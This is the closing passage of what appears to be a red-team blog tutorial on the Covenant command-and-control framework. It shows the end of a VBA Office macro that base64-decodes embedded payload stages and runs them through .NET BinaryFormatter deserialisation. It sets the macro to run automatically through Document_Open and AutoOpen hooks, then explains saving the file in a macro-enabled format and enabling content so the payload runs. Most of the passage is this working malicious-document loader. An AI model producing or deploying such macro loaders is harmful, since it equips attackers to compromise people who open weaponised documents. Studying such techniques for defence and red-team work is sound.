stage_2 = stage_2 & "LkNvbXBvbmVudE1vZGVsLkRlc2lnbi5Db21tYW5kSUQEAAAACToAAAAQTwAAAAIAAAAJggAAAAgIACAAAASCAAAAC1N5c3RlbS5H"
stage_2 = stage_2 & "dWlkCwAAAAJfYQJfYgJfYwJfZAJfZQJfZgJfZwJfaAJfaQJfagJfawAAAAAAAAAAAAAACAcHAgICAgICAgITE9J07irREYv7AKDJ"
stage_2 = stage_2 & "Dyb3Cws="


    Dim stm_1 As Object, fmt_1 As Object
    
    manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?>"
	manifest = manifest & "<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
	manifest = manifest & "<assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" />"
	manifest = manifest & "<clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Serialization"
	manifest = manifest & ".Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" "
	manifest = manifest & "runtimeVersion=""v4.0.30319"" /><clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" "
	manifest = manifest & "progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" /></assembly>"


    Set actCtx = CreateObject("Microsoft.Windows.ActCtx")
    actCtx.ManifestText = manifest
        
    Set stm_1 = actCtx.CreateObject("System.IO.MemoryStream")
    Set fmt_1 = actCtx.CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")

    Dim Decstage_1
    Decstage_1 = b64Decode(stage_1)

    For Each i In Decstage_1
        stm_1.WriteByte i
    Next i

    On Error Resume Next

    stm_1.Position = 0
    Dim o1 As Object
    Set o1 = fmt_1.Deserialize_2(stm_1)

    If Err.Number <> 0 Then
       Dim stm_2 As Object
       
       Set stm_2 = actCtx.CreateObject("System.IO.MemoryStream")

       Dim Decstage_2
       Decstage_2 = b64Decode(stage_2)

       For Each j In Decstage_2
        stm_2.WriteByte j
       Next j

       stm_2.Position = 0
       Dim o2 As Object
       Set o2 = fmt_1.Deserialize_2(stm_2)
    End If

End Function

Sub Document_Open()
 Exec
End Sub

Sub AutoOpen()
 Exec
End Sub
```

Save the VBA code and now, in order for this to work, we must save our document in a Macro-Enabled format such as .doc or  .docm; Unfortunately, the newer .docx will not store macros.

Now that the document is saved, we can try opening it again. However, we are presented with a security warning banner.

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov12.JPG">
</p>


If we press the Enable Content button, the macro will execute and the message box will appear as illustrated below. 

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov13.JPG">
</p>

## Conclusion